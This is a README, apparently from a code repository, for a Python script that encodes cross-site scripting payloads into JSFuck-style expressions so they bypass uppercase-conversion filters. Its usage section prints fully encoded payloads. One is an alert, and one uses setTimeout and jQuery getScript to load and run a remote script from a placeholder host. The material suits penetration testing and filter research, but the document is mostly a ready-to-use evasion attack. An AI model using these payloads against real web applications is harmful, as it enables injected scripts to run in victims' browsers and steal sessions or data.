# XSS-ToUpperBypass
A little python script that encod XSS payload to bypass a to Upper protection

## Credits
Based on the excellent work of Master SEC : https://master-sec.medium.com/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce

## Usage
```bash
$ python ./ToUpperBypass.py                   
Usage: python ./ToUpperBypass.py '<string to encode>'

$ python ./ToUpperBypass.py 'a+l+e+r+t("XSS")' 
Result :
(![]+{})[1]+(![]+[])[2]+([]+{})[4]+(!![]+[])[1]+([]+{})[6]("XSS")

$ python ./ToUpperBypass.py '[][f+i+l+l][c+o+n+s+t+r+u+c+t+o+r](s+e+t+"T"+i+m+e+o+u+t+"("+f+u+n+c+t+i+o+n+"(){ $."+g+e+t+"S"+c+r+i+p+t+"(\""//TEST/"+h+a+n+d+l+e+"."+j+s+"\"")(); }, 3000);")();'
Result :
[][([][1]+[])[4]+([][1]+[])[5]+(![]+[])[2]+(![]+[])[2]][([]+{})[5]+([]+{})[1]+([][1]+[])[1]+(![]+[])[3]+([]+{})[6]+(!![]+[])[1]+([][1]+[])[0]+([]+{})[5]+([]+{})[6]+([]+{})[1]+(!![]+[])[1]]((![]+[])[3]+([]+{})[4]+([]+{})[6]+"T"+([][1]+[])[5]+(22)[([]+{})[6]+([]+{})[1]+"S"+([]+{})[6]+(!![]+[])[1]+([][1]+[])[5]+([][1]+[])[1]+([0]+[""][0][([]+{})[5]+([]+{})[1]+([][1]+[])[1]+(![]+[])[3]+([]+{})[6]+(!![]+[])[1]+([][1]+[])[0]+([]+{})[5]+([]+{})[6]+([]+{})[1]+(!![]+[])[1]])[15]](36)+([]+{})[4]+([]+{})[1]+([][1]+[])[0]+([]+{})[6]+"("+([][1]+[])[4]+([][1]+[])[0]+([][1]+[])[1]+([]+{})[5]+([]+{})[6]+([][1]+[])[5]+([]+{})[1]+([][1]+[])[1]+"(){ $."+([0]+[""][0][([]+{})[5]+([]+{})[1]+([][1]+[])[1]+(![]+[])[3]+([]+{})[6]+(!![]+[])[1]+([][1]+[])[0]+([]+{})[5]+([]+{})[6]+([]+{})[1]+(!![]+[])[1]])[15]+([]+{})[4]+([]+{})[6]+"S"+([]+{})[5]+(!![]+[])[1]+([][1]+[])[5]+(25)[([]+{})[6]+([]+{})[1]+"S"+([]+{})[6]+(!![]+[])[1]+([][1]+[])[5]+([][1]+[])[1]+([0]+[""][0][([]+{})[5]+([]+{})[1]+([][1]+[])[1]+(![]+[])[3]+([]+{})[6]+(!![]+[])[1]+([][1]+[])[0]+([]+{})[5]+([]+{})[6]+([]+{})[1]+(!![]+[])[1]])[15]](36)+([]+{})[6]+"(\""//TEST/"+(17)[([]+{})[6]+([]+{})[1]+"S"+([]+{})[6]+(!![]+[])[1]+([][1]+[])[5]+([][1]+[])[1]+([0]+[""][0][([]+{})[5]+([]+{})[1]+([][1]+[])[1]+(![]+[])[3]+([]+{})[6]+(!![]+[])[1]+([][1]+[])[0]+([]+{})[5]+([]+{})[6]+([]+{})[1]+(!![]+[])[1]])[15]](36)+(![]+{})[1]+([][1]+[])[1]+([][1]+[])[2]+(![]+[])[2]+([]+{})[4]+"."+([]+{})[3]+(![]+[])[3]+"\"")(); }, 3000);")();
```

## Contributing
Contributions are welcome! If you find a bug or have a feature request, please create an issue or submit a pull request.

## Legal disclaimer
Use of this script for attacking a target without mutual consent is illegal. It's is the end user responsibility to obey all applicables laws for his location Developers assume no lisibility and are not responsible for any misuse or domage caused by this program
